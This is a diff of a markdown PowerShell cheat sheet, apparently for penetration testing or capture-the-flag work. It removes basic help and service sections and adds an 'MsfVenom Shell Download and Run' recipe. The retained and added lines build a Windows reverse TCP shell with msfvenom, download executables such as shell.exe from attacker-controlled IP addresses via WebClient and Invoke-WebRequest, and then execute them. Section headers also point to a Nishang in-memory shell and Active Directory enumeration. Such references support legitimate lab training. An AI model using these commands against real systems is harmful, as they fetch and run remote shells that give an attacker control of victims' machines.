@@ -1,35 +1,5 @@
 # PowerShell
 
-## PowerShell Basics
-
-| Command | Summary |
-| ---------------------------- | ---------------------------- |
-| Get-Help Get-FileHash | This command gets the help page for the cmdlet you are trying to run |
-| Get-Help process | This finds all cmdlets with process in the name |
-| Get-Help Get-FileHash -Full | This requests the full help documentation |
-| Get-Help Get-FileHash -Examples | This requests examples for the cmdlet you requested |
-| Get-Command -CommandType cmdlet | This provides a list of ALL available cmdlets on your system |
-| Get-Process | This lists the processes running on your host (like ps -aux on nix) |
-| Get-Command -Module Get-FileHash | Provides a list of all commands in module | 
-
-## Importing Module
-```
-Import-Module <name of ps1>
-OR
-. .\powershell-script.ps1
-```
-
-## Checking Services
-```
-get-service AdvancedSystemCareService9
-stop-service AdvancedSystemCareService9
-start-service AdvancedSystemCareService9
-
-powershell -c get-service AdvancedSystemCareService9
-powershell -c stop-service AdvancedSystemCareService9
-powershell -c start-service AdvancedSystemCareService9
-```
-
 ## Invoke-WebRequest
 ```
 c:/> Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
@@ -44,6 +14,12 @@ nt authority\system
 ## New-Object System.Net.WebClient (alternate download method)
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/shell.exe','shell.exe')"
+```
+
+## MsfVenom Shell Download and Run (two-liner)
+```
+msfvenom --payload windows/x64/shell_reverse_tcp LHOST=10.13.48.232 LPORT=9001 --format exe > shell.exe
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.48.232/shell.exe','c:\temp\shell.exe')";powershell.exe c:\temp\shell.exe
 ```
 
 ## Nishang Shell (Running PS1 without saving to disk)
@@ -294,7 +270,6 @@ Get-ADGroupMember -Identity 'Service Technicians' | ?{$_.ObjectClass -eq "Group"
 Get-ADGroup -Filter "adminCount -eq 1"
 ```
 
-
 ## Escape Characters
 | Character | Escaped As | Note |
 | ---------------------------- | ---------------------------- | ---------------------------- |
@@ -306,7 +281,6 @@ Get-ADGroup -Filter "adminCount -eq 1"
 | () | 28 | Escaped automatically |
 | ) | 29 | Escaped automatically |
 | / | /2f | Escaped automatically |
-
 
 
 ## PowerShell Operators
